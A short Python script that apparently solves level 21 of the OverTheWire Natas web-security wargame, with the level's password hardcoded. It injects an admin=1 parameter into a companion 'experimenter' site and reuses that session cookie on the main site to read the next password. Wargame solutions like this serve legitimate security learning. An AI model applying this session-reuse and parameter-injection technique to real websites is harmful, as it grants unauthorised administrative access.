import requests
import re

username ='natas21'
password ='IFekPyrQXftziDEsUr3x21sYuahypdgJ'

url = 'http://%s.natas.labs.overthewire.org/' %username
experimenter = "http://natas21-experimenter.natas.labs.overthewire.org/"
session = requests.Session()

responce = session.get(experimenter + "?debug=true&submit=1&admin=1" ,auth =(username,password))
content = responce.text
cook = session.cookies["PHPSESSID"]
cookies = {"PHPSESSID":cook}

responce = session.get(url,auth = (username,password),cookies=cookies)
print (responce.text)
content = responce.text


print("the password for natas22 is = ",re.findall("Password: (.*)</pre>",content)[0])